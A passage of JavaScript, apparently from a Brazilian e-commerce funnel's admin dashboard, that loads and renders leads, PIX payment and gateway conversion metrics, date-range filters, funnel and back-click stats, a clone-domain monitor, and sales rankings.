                        <span class="lead-stack__meta">${esc(txidNote)}</span>
                    </div>
                </td>
            `;
            leadsBody.appendChild(tr);
        });

        if (leadsCount) leadsCount.textContent = String(offset + rows.length);
    };

    const formatPercentOneDecimal = (value) => {
        const num = Number(value || 0);
        if (!Number.isFinite(num)) return '0%';
        const rounded = Math.round(num * 10) / 10;
        return Number.isInteger(rounded) ? `${rounded.toFixed(0)}%` : `${rounded.toFixed(1)}%`;
    };

    const renderNativeFunnel = (funnelSummary = null) => {
        if (!nativeFunnelTrack) return;

        const funnel = funnelSummary && typeof funnelSummary === 'object' ? funnelSummary : null;
        const stages = Array.isArray(funnel?.stages) ? funnel.stages : [];
        const base = Number(funnel?.base || 0);
        if (nativeFunnelBase) nativeFunnelBase.textContent = `Base: ${base}`;

        nativeFunnelTrack.innerHTML = '';
        if (nativeFunnelEmpty) nativeFunnelEmpty.classList.toggle('hidden', stages.length > 0);
        if (!stages.length) return;

        stages.forEach((stage, index) => {
            const rawCount = Number(stage?.countRaw || 0);
            const pctBase = Number(stage?.pctFromBase || 0);
            const pctPrev = Number(stage?.pctFromPrev || 0);
            const dropPct = Number(stage?.dropPct || 0);
            const directEntries = Number(stage?.directEntries || 0);
            const progress = Math.max(0, Math.min(100, pctBase));
            const prevLabel = index === 0
                ? 'Referencia da base'
                : `${formatPercentOneDecimal(pctPrev)} vs etapa anterior`;
            const dropLabel = index === 0 ? '' : `Queda: ${formatPercentOneDecimal(dropPct)}`;

            const card = document.createElement('article');
            card.className = 'admin-native-stage';
            card.setAttribute('role', 'listitem');
            card.innerHTML = `
                <span class="admin-native-stage__title">${stage?.shortLabel || stage?.label || stage?.key || '-'}</span>
                <strong class="admin-native-stage__count">${rawCount}</strong>
                <div class="admin-native-stage__bar"><i style="width: ${progress}%"></i></div>
                <span class="admin-native-stage__meta">${formatPercentOneDecimal(pctBase)} da base</span>
                <span class="admin-native-stage__delta">${prevLabel}${dropLabel ? ` | ${dropLabel}` : ''}</span>
                ${directEntries > 0 ? `<span class="admin-native-stage__direct">+${directEntries} entrada direta</span>` : ''}
                <span class="admin-native-stage__description">${stage?.description || ''}</span>
            `;
            nativeFunnelTrack.appendChild(card);
        });
    };

    const pad2 = (value) => String(value).padStart(2, '0');
    const SIMPLE_DATE_RE = /^\d{4}-\d{2}-\d{2}$/;
    const toUtcDateInput = (dateObj) => {
        if (!(dateObj instanceof Date) || Number.isNaN(dateObj.getTime())) return '';
        return `${dateObj.getFullYear()}-${pad2(dateObj.getMonth() + 1)}-${pad2(dateObj.getDate())}`;
    };
    const parseDateInputUtc = (value) => {
        const raw = String(value || '').trim();
        if (!SIMPLE_DATE_RE.test(raw)) return null;
        const [year, month, day] = raw.split('-').map(Number);
        const date = new Date(year, month - 1, day, 0, 0, 0, 0);
        if (Number.isNaN(date.getTime())) return null;
        return date;
    };
    const shiftDateInput = (dateInput, days) => {
        const base = parseDateInputUtc(dateInput);
        if (!base) return '';
        base.setDate(base.getDate() + Number(days || 0));
        return toUtcDateInput(base);
    };
    const formatDateInputLabel = (dateInput) => {
        const date = parseDateInputUtc(dateInput);
        if (!date) return '-';
        return date.toLocaleDateString('pt-BR');
    };
    const buildDateInputLocalExactRange = (fromInput, toInput) => {
        const buildLocalBoundary = (value, endOfDay = false) => {
            const raw = String(value || '').trim();
            if (!SIMPLE_DATE_RE.test(raw)) return '';
            const [year, month, day] = raw.split('-').map(Number);
            const date = endOfDay
                ? new Date(year, month - 1, day, 23, 59, 59, 999)
                : new Date(year, month - 1, day, 0, 0, 0, 0);
            return Number.isNaN(date.getTime()) ? '' : date.toISOString();
        };
        return {
            fromIsoExact: buildLocalBoundary(fromInput, false),
            toIsoExact: buildLocalBoundary(toInput || fromInput, true)
        };
    };

    const buildPresetRange = (preset) => {
        const today = toUtcDateInput(new Date());
        if (preset === 'today') {
            return { preset: 'today', from: today, to: today };
        }
        if (preset === 'yesterday') {
            const day = shiftDateInput(today, -1);
            return { preset: 'yesterday', from: day, to: day };
        }
        if (preset === 'last7') {
            return { preset: 'last7', from: shiftDateInput(today, -6), to: today };
        }
        if (preset === 'last30') {
            return { preset: 'last30', from: shiftDateInput(today, -29), to: today };
        }
        if (preset === 'thisMonth') {
            const now = new Date();
            const from = `${now.getFullYear()}-${pad2(now.getMonth() + 1)}-01`;
            return { preset: 'thisMonth', from, to: today };
        }
        if (preset === 'custom') {
            return { preset: 'custom', from: '', to: '' };
        }
        return { preset: 'all', from: '', to: '' };
    };

    const sanitizeOverviewRange = (rangeInput = {}) => {
        const preset = String(rangeInput?.preset || 'all').trim();
        const from = SIMPLE_DATE_RE.test(String(rangeInput?.from || '').trim()) ? String(rangeInput.from).trim() : '';
        const to = SIMPLE_DATE_RE.test(String(rangeInput?.to || '').trim()) ? String(rangeInput.to).trim() : '';
        if (preset === 'custom') {
            return { preset, from, to };
        }
        return buildPresetRange(preset);
    };

    const saveOverviewRange = () => {
        try {
            localStorage.setItem(OVERVIEW_RANGE_STORAGE_KEY, JSON.stringify(overviewRange));
        } catch (_error) {}
    };

    const loadOverviewRange = () => {
        try {
            const raw = localStorage.getItem(OVERVIEW_RANGE_STORAGE_KEY);
            if (!raw) return sanitizeOverviewRange({ preset: 'all' });
            const parsed = JSON.parse(raw);
            return sanitizeOverviewRange(parsed);
        } catch (_error) {
            return sanitizeOverviewRange({ preset: 'all' });
        }
    };

    const describeOverviewRange = (range) => {
        if (!range || range.preset === 'all') return 'Periodo: todo historico';
        const from = String(range.from || '').trim();
        const to = String(range.to || '').trim();
        if (from && to && from === to) {
            return `Periodo: ${formatDateInputLabel(from)}`;
        }
        if (from && to) {
            return `Periodo: ${formatDateInputLabel(from)} ate ${formatDateInputLabel(to)}`;
        }
        if (from) {
            return `Periodo: desde ${formatDateInputLabel(from)}`;
        }
        if (to) {
            return `Periodo: ate ${formatDateInputLabel(to)}`;
        }
        return 'Periodo: personalizado';
    };

    const syncOverviewRangeUi = () => {
        if (!hasOverviewRangeControls) return;
        if (overviewRangePreset) overviewRangePreset.value = overviewRange.preset || 'all';
        if (overviewRangeFrom) overviewRangeFrom.value = overviewRange.from || '';
        if (overviewRangeTo) overviewRangeTo.value = overviewRange.to || '';
        const isCustom = String(overviewRange.preset || '') === 'custom';
        if (overviewRangeFrom) overviewRangeFrom.disabled = !isCustom;
        if (overviewRangeTo) overviewRangeTo.disabled = !isCustom;
        if (overviewRangeStatus) overviewRangeStatus.textContent = describeOverviewRange(overviewRange);
    };

    const getActiveOverviewRange = () => {
        if (!hasOverviewRangeControls) return { from: '', to: '' };
        if (overviewRange.preset === 'custom') {
            return {
                from: String(overviewRange.from || '').trim(),
                to: String(overviewRange.to || '').trim()
            };
        }
        const built = buildPresetRange(overviewRange.preset || 'all');
        return { from: built.from || '', to: built.to || '' };
    };

    const applyOverviewRangeAndReload = async () => {
        if (!hasOverviewRangeControls) return;
        const selectedPreset = String(overviewRangePreset?.value || overviewRange.preset || 'all');

        if (selectedPreset === 'custom') {
            const from = String(overviewRangeFrom?.value || '').trim();
            const to = String(overviewRangeTo?.value || '').trim();
            if (from && !SIMPLE_DATE_RE.test(from)) {
                showToast('Data inicial invalida.', 'error');
                return;
            }
            if (to && !SIMPLE_DATE_RE.test(to)) {
                showToast('Data final invalida.', 'error');
                return;
            }
            if (from && to && from > to) {
                showToast('Periodo invalido: data inicial maior que final.', 'error');
                return;
            }
            overviewRange = { preset: 'custom', from, to };
        } else {
            overviewRange = buildPresetRange(selectedPreset);
        }

        saveOverviewRange();
        syncOverviewRangeUi();
        if (wantsLeads) await loadLeads({ reset: true });
        if (shouldAutoLoadSalesInsights) await loadSalesInsights();
        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
    };

    const initializeOverviewRange = () => {
        if (!hasOverviewRangeControls) return;
        overviewRange = loadOverviewRange();
        syncOverviewRangeUi();
    };

    const updateMetrics = (rows, reset = false, summary = null) => {
        if (summary && typeof summary === 'object') {
            metrics.total = Number(summary.total || 0);
            metrics.pix = Number(summary.pix || 0);
            metrics.frete = Number(summary.frete || 0);
            metrics.cep = Number(summary.cep || 0);
            metrics.paid = Number(summary.paid || 0);
            metrics.lastUpdated = String(summary.lastUpdated || '');
            metrics.funnel = summary.funnel && typeof summary.funnel === 'object' ? summary.funnel : null;
            metrics.gatewayStats = normalizeGatewayStatsMap(summary.gatewayStats || {});
        } else {
        if (reset) {
            metrics.total = 0;
            metrics.pix = 0;
            metrics.frete = 0;
            metrics.cep = 0;
            metrics.paid = 0;
            metrics.lastUpdated = '';
            metrics.funnel = null;
            metrics.gatewayStats = emptyGatewayStats();
        }

        metrics.total += rows.length;
        rows.forEach((row) => {
            const cep = String(row.cep || '').trim();
            const frete = String(row.frete || '').trim();
            const pixTxid = String(row.pix_txid || '').trim();
            const ev = String(row.evento || '').toLowerCase().trim();
            const gateway = resolveGatewayMetricKey(row.gateway || '');
            const gatewayStats = gateway ? metrics.gatewayStats[gateway] : null;

            if (gatewayStats) gatewayStats.leads += 1;
            if (pixTxid && pixTxid !== '-') metrics.pix += 1;
            if (pixTxid && pixTxid !== '-' && gatewayStats) gatewayStats.pix += 1;
            if (frete && frete !== '-') metrics.frete += 1;
            if (cep && cep !== '-') metrics.cep += 1;
            const isPaid = row.is_paid === true || ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
            if (isPaid) metrics.paid += 1;
            if (isPaid && gatewayStats) gatewayStats.paid += 1;
            else if (ev === 'pix_refunded' && gatewayStats) gatewayStats.refunded += 1;
            else if ((ev === 'pix_refused' || ev === 'pix_failed') && gatewayStats) gatewayStats.refused += 1;
            else if ((ev === 'pix_pending' || ev === 'pix_created') && gatewayStats) gatewayStats.pending += 1;
            if (!metrics.lastUpdated && (row.event_time || row.updated_at)) metrics.lastUpdated = row.event_time || row.updated_at;
        });
        }

        if (metricTotal) metricTotal.textContent = String(metrics.total);
        if (metricPix) metricPix.textContent = String(metrics.paid);
        if (metricFrete) metricFrete.textContent = String(metrics.frete);
        if (metricCep) metricCep.textContent = String(metrics.cep);
        if (metricUpdated) {
            metricUpdated.textContent = formatDateTime(metrics.lastUpdated);
        }
        if (metricBase) metricBase.textContent = `Base: ${metrics.total}`;

        const total = metrics.total || 0;
        const pctPix = total ? Math.round((metrics.paid / total) * 100) : 0;
        const pctFrete = total ? Math.round((metrics.frete / total) * 100) : 0;
        const pctCep = total ? Math.round((metrics.cep / total) * 100) : 0;

        if (metricConvPix) metricConvPix.textContent = `${pctPix}%`;
        if (metricConvFrete) metricConvFrete.textContent = `${pctFrete}%`;
        if (metricConvCep) metricConvCep.textContent = `${pctCep}%`;
        if (funnelPix) funnelPix.style.width = `${pctPix}%`;
        if (funnelFrete) funnelFrete.style.width = `${pctFrete}%`;
        if (funnelCep) funnelCep.style.width = `${pctCep}%`;
        if (funnelPixValue) funnelPixValue.textContent = `${pctPix}%`;
        if (funnelFreteValue) funnelFreteValue.textContent = `${pctFrete}%`;
        if (funnelCepValue) funnelCepValue.textContent = `${pctCep}%`;

        const ghostStats = metrics.gatewayStats.ghostspay || { pix: 0, paid: 0 };
        const sunizeStats = metrics.gatewayStats.sunize || { pix: 0, paid: 0 };
        const paradiseStats = metrics.gatewayStats.paradise || { pix: 0, paid: 0 };
        const atomopayStats = metrics.gatewayStats.atomopay || { pix: 0, paid: 0 };
        const ghostConv = ghostStats.pix ? Math.round((Number(ghostStats.paid || 0) / Number(ghostStats.pix || 0)) * 100) : 0;
        const sunizeConv = sunizeStats.pix ? Math.round((Number(sunizeStats.paid || 0) / Number(sunizeStats.pix || 0)) * 100) : 0;
        const paradiseConv = paradiseStats.pix ? Math.round((Number(paradiseStats.paid || 0) / Number(paradiseStats.pix || 0)) * 100) : 0;
        const atomopayConv = atomopayStats.pix ? Math.round((Number(atomopayStats.paid || 0) / Number(atomopayStats.pix || 0)) * 100) : 0;

        if (metricGatewayGhostspayConv) metricGatewayGhostspayConv.textContent = `${ghostConv}%`;
        if (metricGatewayGhostspayDetail) {
            metricGatewayGhostspayDetail.textContent = `${Number(ghostStats.paid || 0)} pagos / ${Number(ghostStats.pix || 0)} PIX`;
        }
        if (metricGatewaySunizeConv) metricGatewaySunizeConv.textContent = `${sunizeConv}%`;
        if (metricGatewaySunizeDetail) {
            metricGatewaySunizeDetail.textContent = `${Number(sunizeStats.paid || 0)} pagos / ${Number(sunizeStats.pix || 0)} PIX`;
        }
        if (metricGatewayParadiseConv) metricGatewayParadiseConv.textContent = `${paradiseConv}%`;
        if (metricGatewayParadiseDetail) {
            metricGatewayParadiseDetail.textContent = `${Number(paradiseStats.paid || 0)} pagos / ${Number(paradiseStats.pix || 0)} PIX`;
        }
        if (metricGatewayAtomopayConv) metricGatewayAtomopayConv.textContent = `${atomopayConv}%`;
        if (metricGatewayAtomopayDetail) {
            metricGatewayAtomopayDetail.textContent = `${Number(atomopayStats.paid || 0)} pagos / ${Number(atomopayStats.pix || 0)} PIX`;
        }

        if (metricBestGateway) {
            const options = [
                { label: 'GhostsPay', conv: ghostConv, paid: Number(ghostStats.paid || 0), pix: Number(ghostStats.pix || 0) },
                { label: 'Sunize', conv: sunizeConv, paid: Number(sunizeStats.paid || 0), pix: Number(sunizeStats.pix || 0) },
                { label: 'Paradise', conv: paradiseConv, paid: Number(paradiseStats.paid || 0), pix: Number(paradiseStats.pix || 0) },
                { label: 'AtomoPay', conv: atomopayConv, paid: Number(atomopayStats.paid || 0), pix: Number(atomopayStats.pix || 0) }
            ].filter((item) => item.pix > 0);
            if (!options.length) {
                metricBestGateway.textContent = '-';
            } else {
                options.sort((a, b) => {
                    if (b.conv !== a.conv) return b.conv - a.conv;
                    if (b.paid !== a.paid) return b.paid - a.paid;
                    return b.pix - a.pix;
                });
                metricBestGateway.textContent = `${options[0].label} (${options[0].conv}%)`;
            }
        }

        syncGatewayOrderStats();
        renderNativeFunnel(metrics.funnel);
    };

    const loadLeads = async ({ reset = false } = {}) => {
        if (loadingLeads) return;
        loadingLeads = true;
        if (reset) {
            offset = 0;
        }

        const query = leadsSearch?.value.trim() || '';
        const url = new URL('/api/admin/leads', window.location.origin);
        url.searchParams.set('limit', String(limit));
        url.searchParams.set('offset', String(offset));
        if (query) url.searchParams.set('q', query);
        if (metricTotal) url.searchParams.set('summary', '1');
        if (metricTotal) url.searchParams.set('summaryMax', '80000');
        const activeRange = getActiveOverviewRange();
        if (activeRange.from) url.searchParams.set('from', activeRange.from);
        if (activeRange.to) url.searchParams.set('to', activeRange.to);

        const res = await adminFetch(url.toString());
        if (res.ok) {
            const data = await res.json();
            const rows = data.data || [];
            renderLeads(rows, !reset);
            updateMetrics(rows, reset, data.summary || null);
            if (paymentsGatewayOrder) {
                loadGatewayOrderDailyStats().catch(() => null);
            }
            if (overviewRangeStatus && data?.summary?.range && hasOverviewRangeControls) {
                overviewRangeStatus.textContent = describeOverviewRange({
                    preset: overviewRange.preset,
                    from: activeRange.from || '',
                    to: activeRange.to || ''
                });
            }
            offset += rows.length;
        } else if (overviewRangeStatus && hasOverviewRangeControls) {
            const detail = await res.json().catch(() => ({}));
            overviewRangeStatus.textContent = detail?.error || 'Falha ao carregar periodo selecionado.';
        }
        loadingLeads = false;
    };

    const riskLabel = (risk, score) => {
        const normalized = String(risk || '').toLowerCase();
        if (normalized === 'alto') return `Alto (${score || 0})`;
        if (normalized === 'medio') return `Medio (${score || 0})`;
        return `Baixo (${score || 0})`;
    };

    const renderCloners = (data = {}) => {
        const summary = data.summary || {};
        const domains = summary.domains || [];
        const events = data.events || [];
        const pages = summary.pages || [];

        if (clonersTotalDomains) clonersTotalDomains.textContent = String(summary.totalDomains || 0);
        if (clonersTotalEvents) clonersTotalEvents.textContent = String(summary.totalEvents || 0);
        if (clonersHighRisk) clonersHighRisk.textContent = String(summary.highRisk || 0);
        if (clonersLastSeen) clonersLastSeen.textContent = formatDateTime(summary.lastSeen);
        if (clonersOfficialHosts) {
            clonersOfficialHosts.textContent = (data.officialHosts || []).join(', ') || '-';
        }
        if (clonersEmpty) {
            clonersEmpty.classList.toggle('hidden', domains.length > 0 || Boolean(data.warning));
        }

        if (clonersDomainsBody) {
            clonersDomainsBody.innerHTML = domains.length
                ? domains.map((item) => {
                    const pageList = (item.pages || []).slice(0, 3).map((page) => `${page.page} (${page.count})`).join(', ');
                    const href = item.latestHref || '';
                    return `
                        <tr>
                            <td>
                                <strong>${escapeHtml(item.host || '-')}</strong>
                                <span class="admin-muted">${escapeHtml(href || '-')}</span>
                            </td>
                            <td><span class="admin-chip admin-chip--risk-${escapeHtml(item.risk || 'baixo')}">${escapeHtml(riskLabel(item.risk, item.maxRisk))}</span></td>
                            <td>${escapeHtml(String(item.count || 0))}</td>
                            <td>${escapeHtml(pageList || '-')}</td>
                            <td>${escapeHtml(item.latestIp || '-')}</td>
                            <td>${escapeHtml(formatDateTime(item.firstSeen))}</td>
                            <td>${escapeHtml(formatDateTime(item.lastSeen))}</td>
                            <td>${href ? `<a class="btn-secondary btn-secondary--compact" href="${escapeHtml(href)}" target="_blank" rel="noopener noreferrer">Abrir</a>` : '-'}</td>
                        </tr>
                    `;
                }).join('')
                : '<tr><td colspan="8" class="admin-muted">Nenhum dominio suspeito registrado.</td></tr>';
        }

        if (clonersEventsBody) {
            clonersEventsBody.innerHTML = events.length
                ? events.slice(0, 80).map((event) => `
                    <tr>
                        <td>${escapeHtml(formatDateTime(event.created_at))}</td>
                        <td>${escapeHtml(event.reported_host || '-')}</td>
                        <td>${escapeHtml(event.page || '-')}</td>
                        <td>${escapeHtml(event.event_type || '-')}</td>
                        <td>${escapeHtml(String(event.risk_score || 0))}</td>
                        <td>${escapeHtml(event.referrer || '-')}</td>
                        <td>${escapeHtml(event.user_agent || '-')}</td>
                    </tr>
                `).join('')
                : '<tr><td colspan="7" class="admin-muted">Nenhum evento bruto registrado.</td></tr>';
        }

        if (clonersPages) {
            clonersPages.innerHTML = pages.length
                ? pages.slice(0, 10).map((item) => `
                    <div class="cloner-page-pill">
                        <strong>${escapeHtml(item.count || 0)}</strong>
                        <span>${escapeHtml(item.page || '-')}</span>
                    </div>
                `).join('')
                : '<span class="admin-muted">Aguardando eventos por pagina.</span>';
        }
    };

    const loadCloners = async () => {
        if (!wantsCloners) return;
        if (clonersStatus) clonersStatus.textContent = 'Carregando sinais...';
        try {
            const res = await adminFetch('/api/admin/clonadores');
            const data = await res.json().catch(() => ({}));
            renderCloners(data);
            if (clonersStatus) {
                clonersStatus.textContent = data.warning || (data.ok ? 'Monitoramento passivo ativo.' : 'Monitoramento sem dados agora.');
            }
        } catch (_error) {
            if (clonersStatus) clonersStatus.textContent = 'Falha ao carregar clonadores.';
        }
    };

    let leadsSearchDebounce = 0;

    const reconcilePix = async () => {
        if (!leadsReconcile) return;
        leadsReconcile.disabled = true;
        if (leadsReconcileStatus) leadsReconcileStatus.textContent = 'Consultando e sincronizando os ultimos 100 PIX gerados...';
        const res = await adminFetch('/api/admin/pix-reconcile', {
            method: 'POST',
            body: JSON.stringify({
                maxTx: 100,
                mutate: 1
            })
        });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            if (leadsReconcileStatus) {
                const extra = detail?.detail ? ` (${typeof detail.detail === 'string' ? detail.detail : JSON.stringify(detail.detail).slice(0, 180)})` : '';
                leadsReconcileStatus.textContent = `${detail?.error || 'Falha ao consultar transacoes.'}${extra}`;
            }
            showToast('Falha ao consultar transacoes.', 'error');
            leadsReconcile.disabled = false;
            return;
        }
        const data = await res.json().catch(() => ({}));
        await loadLeads({ reset: true });
        if (leadsReconcileStatus) {
            leadsReconcileStatus.textContent = `Consultados ${data.checked || 0}, pagos ${data.confirmed || 0}, pendentes ${data.pending || 0}, estornados ${data.refunded || 0}, recusados ${data.refused || 0}. Leads sincronizados: ${data.updated || 0}.`;
        }
        if (data.warning) showToast(data.warning, 'error');
        showToast('Consulta de transacoes finalizada e painel sincronizado.', 'success');
        leadsReconcile.disabled = false;
    };

    const exportLeads = async () => {
        if (!leadsExport) return;

        const segment = String(leadsExportFilter?.value || 'all').trim() || 'all';
        leadsExport.disabled = true;
        if (leadsExportStatus) leadsExportStatus.textContent = 'Gerando planilha...';

        try {
            const url = new URL('/api/admin/leads/export', window.location.origin);
            url.searchParams.set('segment', segment);

            const res = await fetch(url.toString(), {
                credentials: 'same-origin'
            });

            if (!res.ok) {
                const detail = await res.json().catch(() => ({}));
                throw new Error(detail?.error || 'Falha ao exportar leads.');
            }

            const blob = await res.blob();
            const fallbackFileName = `leads-${segment}.xlsx`;
            const fileName = readDownloadFileName(
                res.headers.get('Content-Disposition'),
                fallbackFileName
            );
            const exportCount = Number(res.headers.get('X-Export-Count') || 0);
            const truncated = res.headers.get('X-Export-Truncated') === '1';
            const objectUrl = URL.createObjectURL(blob);
            const link = document.createElement('a');

            link.href = objectUrl;
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            link.remove();
            window.setTimeout(() => URL.revokeObjectURL(objectUrl), 1500);

            if (leadsExportStatus) {
                if (exportCount > 0) {
                    leadsExportStatus.textContent = truncated
                        ? `${exportCount} leads exportados. Limite maximo atingido.`
                        : `${exportCount} leads exportados com sucesso.`;
                } else {
                    leadsExportStatus.textContent = 'Nenhum lead encontrado para este filtro.';
                }
            }
            showToast('Planilha exportada com sucesso.', 'success');
        } catch (error) {
            if (leadsExportStatus) {
                leadsExportStatus.textContent = error?.message || 'Falha ao exportar leads.';
            }
            showToast('Falha ao exportar leads.', 'error');
        } finally {
            leadsExport.disabled = false;
        }
    };

    const loadPageCounts = async () => {
        if (!pagesGrid) return;
        const res = await adminFetch('/api/admin/pages');
        if (!res.ok) return;
        const data = await res.json();
        const rows = (data.data || []).filter((row) => !String(row?.page || '').startsWith('backredirect_'));
        const max = rows.reduce((acc, row) => Math.max(acc, Number(row.total) || 0), 0) || 1;
        pagesGrid.innerHTML = '';
        rows.forEach((row) => {
            const card = document.createElement('div');
            card.className = 'admin-page-card';
            const pct = Math.round(((Number(row.total) || 0) / max) * 100);
            card.innerHTML = `
                <strong>${row.total ?? 0}</strong>
                <span>${row.page || '-'}</span>
                <div class="admin-page-bar"><i style="width: ${pct}%"></i></div>
            `;
            pagesGrid.appendChild(card);
        });

        if (pagesInsights) {
            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell-iof', 'upsell-correios', 'upsell'];
            const map = new Map(rows.map((r) => [r.page, Number(r.total) || 0]));
            pagesInsights.innerHTML = '';
            let prevEffective = null;
            order.forEach((page, index) => {
                if (!map.has(page)) return;
                const current = map.get(page);
                const prev = prevEffective ?? current;
                const carried = Math.min(current, prev);
                const conv = prev ? Math.round((carried / prev) * 100) : 0;
                const drop = prev ? Math.max(0, prev - carried) : 0;
                const direct = Math.max(0, current - prev);
                const meta = funnelPageMeta[page] || { label: page, desc: 'Etapa do funil' };
                const card = document.createElement('div');
                card.className = 'admin-insight-card';
                card.innerHTML = `
                    <span class="admin-insight-pill">${meta.label}</span>
                    <span class="admin-insight-count">Cliques: ${current}</span>
                    <strong>${conv}%</strong>
                    <span>Conversao vs etapa anterior</span>
                    <span>Queda: ${prev ? Math.round((drop / prev) * 100) : 0}%</span>
                    ${direct ? `<span>Entrada direta: ${direct}</span>` : ''}
                    <span>${meta.desc}</span>
                `;
                pagesInsights.appendChild(card);
                prevEffective = carried;
            });
        }
    };

    const loadBackredirects = async () => {
        if (!backredirectGrid) return;
        const res = await adminFetch('/api/admin/backredirects');
        if (!res.ok) return;
        const payload = await res.json().catch(() => ({}));
        const rows = Array.isArray(payload?.data) ? payload.data : [];
        const summary = payload?.summary || {};
        const totalBack = Number(summary.totalBack || 0);

        if (backredirectTotal) {
            backredirectTotal.textContent = String(totalBack);
        }

        if (backredirectTopPage) {
            backredirectTopPage.textContent = rows[0]?.page ? (funnelPageMeta[rows[0].page]?.label || rows[0].page) : '-';
        }
        if (backredirectTopRate) {
            const rate = Number(rows[0]?.rate || 0);
            backredirectTopRate.textContent = `${rate.toFixed(1)}%`;
        }

        if (backredirectGrid) {
            backredirectGrid.innerHTML = '';
            const max = rows.reduce((acc, row) => Math.max(acc, Number(row.backTotal) || 0), 0) || 1;
            rows.forEach((row) => {
                const page = String(row.page || '').trim();
                const meta = funnelPageMeta[page] || { label: `${page || '-'}.html`, desc: 'Etapa do funil' };
                const backTotal = Number(row.backTotal || 0);
                const pageViews = Number(row.pageViews || 0);
                const rate = Number(row.rate || 0);
                const pct = Math.round((backTotal / max) * 100);
                const card = document.createElement('div');
                card.className = 'admin-page-card';
                card.innerHTML = `
                    <strong>${backTotal}</strong>
                    <span>${meta.label}</span>
                    <div class="admin-page-bar"><i style="width: ${pct}%"></i></div>
                    <span>Taxa de voltar: ${rate.toFixed(1)}%</span>
                    <span>Pageviews: ${pageViews}</span>
                    <span>${meta.desc}</span>
                `;
                backredirectGrid.appendChild(card);
            });
            if (!rows.length) {
                const empty = document.createElement('div');
                empty.className = 'admin-insight-card';
                empty.innerHTML = '<strong>Sem dados ainda</strong><span>Assim que houver clique em voltar, os cards aparecem aqui.</span>';
                backredirectGrid.appendChild(empty);
            }
        }

        if (backredirectInsights) {
            backredirectInsights.innerHTML = '';
            rows.slice(0, 6).forEach((row, index) => {
                const page = String(row.page || '').trim();
                const meta = funnelPageMeta[page] || { label: page || '-', desc: 'Etapa do funil' };
                const card = document.createElement('div');
                card.className = 'admin-insight-card';
                card.innerHTML = `
                    <span class="admin-insight-pill">#${index + 1} ${meta.label}</span>
                    <span class="admin-insight-count">${Number(row.backTotal || 0)} leads clicaram voltar</span>
                    <strong>${Number(row.rate || 0).toFixed(1)}%</strong>
                    <span>Taxa de voltar vs pageviews da etapa</span>
                    <span>${meta.desc}</span>
                `;
                backredirectInsights.appendChild(card);
            });
        }
    };

    const buildSalesTopTags = (entry) => {
        const tags = [];
        if (entry?.isTopUpsell) tags.push('#top 1 em upsell');
        if (entry?.isTopOrderBump) tags.push('#top 1 em orderbump');
        return tags;
    };

    const renderSalesTopTagsHtml = (entry) => {
        const tags = buildSalesTopTags(entry);
        if (!tags.length) return '';
        return `
            <div class="sales-ranking-item__badges">
                ${tags.map((tag) => `<span class="sales-ranking-item__tag">${escapeHtml(tag)}</span>`).join('')}
            </div>
        `;
    };

    const renderSalesWinner = (strongNode, detailNode, tagNode, entry, emptyLabel = '-') => {
        if (strongNode) strongNode.textContent = entry?.label || emptyLabel;
        if (tagNode) tagNode.textContent = entry?.label || emptyLabel;
        if (detailNode) {
            const winnerAmount = Number(entry?.amount || 0);
            const winnerAvgTicket = Number(entry?.avgTicket || 0);
            detailNode.textContent = entry
                ? `${entry.count || 0} vendas • ${Number(entry.share || 0).toFixed(1)}% • ${formatCurrency(Number(entry.amount || 0))}`
                : 'Sem vendas ainda';
            if (entry) {
                const winnerParts = [
                    `${entry.count || 0} vendas`,
                    `${Number(entry.share || 0).toFixed(1)}%`,
                    formatCurrency(winnerAmount),
                    `ticket medio ${formatCurrency(winnerAvgTicket)}`
                ];
                const topTags = buildSalesTopTags(entry);
                if (topTags.length) winnerParts.push(topTags.join(' | '));
                detailNode.textContent = winnerParts.join(' | ');
            }
        }
    };

    const renderSalesRankingList = (container, items = [], emptyText = 'Sem vendas aprovadas nesse periodo.') => {
        if (!container) return;
        const rows = Array.isArray(items) ? items : [];
        if (!rows.length) {
            container.innerHTML = `<div class="sales-ranking-empty">${escapeHtml(emptyText)}</div>`;
            return;
        }

        const max = rows.reduce((acc, item) => Math.max(acc, Number(item?.count) || 0), 0) || 1;
        container.innerHTML = rows.map((item, index) => {
            const count = Number(item?.count || 0);
            const amount = Number(item?.amount || 0);
            const avgTicket = Number(item?.avgTicket || 0);
            const share = Number(item?.share || 0);
            const topTagsHtml = renderSalesTopTagsHtml(item);
            const width = Math.max(6, Math.round((count / max) * 100));
            return `
                <article class="sales-ranking-item">
                    <div class="sales-ranking-item__top">
                        <span class="sales-ranking-item__badge">#${index + 1}</span>
                        <strong>${escapeHtml(item?.label || '-')}</strong>
                        <span class="sales-ranking-item__count">${count} vendas</span>
                    </div>
                    <div class="sales-ranking-item__meta">
                        <span>${share.toFixed(1)}% da base paga</span>
                        <span>${escapeHtml(formatCurrency(amount))}</span>
                    </div>
                    <div class="sales-ranking-item__submeta">
                        <span class="sales-ranking-item__avg">Ticket medio: ${escapeHtml(formatCurrency(avgTicket))}</span>
                        ${topTagsHtml}
                    </div>
                    <div class="sales-ranking-bar"><i style="width: ${width}%"></i></div>
                </article>
            `;
        }).join('');
    };

    const renderPublicAudienceList = (items = [], emptyText = 'Sem dados suficientes.') => {
        const rows = Array.isArray(items) ? items.filter((item) => Number(item?.count || 0) > 0) : [];
        if (!rows.length) return `<span>${escapeHtml(emptyText)}</span>`;
        return rows.slice(0, 5).map((item) => `
            <span>
                <strong>${escapeHtml(item?.label || '-')}</strong>
                ${Number(item?.count || 0)} vendas | ${Number(item?.share || 0).toFixed(1)}% | ${escapeHtml(formatCurrency(Number(item?.amount || 0)))}
            </span>
        `).join('');
    };

    const renderPublicAudience = (audience = null) => {
        if (!publicAudienceResult) return;
        if (!audience || !Number(audience?.totalPaid || 0)) {
            publicAudienceResult.innerHTML = '<div class="sales-ranking-empty">Sem vendas pagas suficientes para montar o público ideal.</div>';
            if (publicAudienceConfidence) publicAudienceConfidence.textContent = 'Sem base';
            return;
        }

        const setup = audience?.setup || {};
        const evidence = audience?.evidence || {};
        const missing = audience?.missing || {};
        const notes = Array.isArray(audience?.notes) ? audience.notes : [];
        const ageWinner = setup?.age?.winner || null;
        const placements = Array.isArray(setup?.placements) && setup.placements.length
            ? setup.placements.join(', ')
            : 'Advantage+ placements';

